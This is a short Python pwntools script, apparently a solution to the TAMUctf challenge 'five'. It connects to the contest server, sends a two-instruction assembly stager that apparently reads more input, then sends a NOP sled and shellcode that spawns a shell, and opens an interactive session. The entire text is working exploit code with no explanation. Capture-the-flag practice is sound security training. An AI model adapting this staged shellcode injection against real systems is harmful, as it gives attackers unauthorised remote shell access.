from pwn import *



elf = context.binary = ELF("./five",checksec=False)

# p = elf.process()

p = remote("tamuctf.com", 443, ssl=True, sni="five")



context.arch = "amd64"



# gdb.attach(p,'''

#     init-gef

#     b *main+107

#     c

#     si

# ''')



payload = asm('''

    mov rsi, rdx

    syscall

''')



p.send(payload)



p.sendline(b"\x90"*0x10 + asm(shellcraft.sh()))



p.interactive()